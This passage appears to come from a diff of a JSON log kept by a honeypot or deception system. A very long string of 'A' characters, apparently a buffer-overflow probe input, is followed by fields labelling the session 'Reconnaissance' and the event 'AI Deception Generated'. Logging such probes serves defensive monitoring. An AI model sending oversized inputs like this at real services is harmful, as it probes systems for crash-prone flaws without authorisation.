AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
